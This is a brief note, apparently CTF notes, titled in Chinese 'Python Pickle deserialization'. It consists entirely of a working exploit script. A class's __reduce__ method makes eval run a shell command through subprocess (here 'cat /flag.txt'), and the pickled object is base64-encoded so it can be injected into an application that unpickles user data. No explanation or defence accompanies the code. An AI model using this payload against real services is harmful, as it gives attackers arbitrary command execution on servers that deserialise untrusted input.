Python Pickle反序列化

Payload:
import pickle
import base64

class Evil:
    def __reduce__(self):
        return (eval, 
                ("{'username': __import__('subprocess').check_output(['/bin/sh','-c','cat /flag.txt']).decode().strip()}",))

payload = pickle.dumps(Evil())
encode_user = base64.urlsafe_b64encode(payload)
print(encode_user.decode())
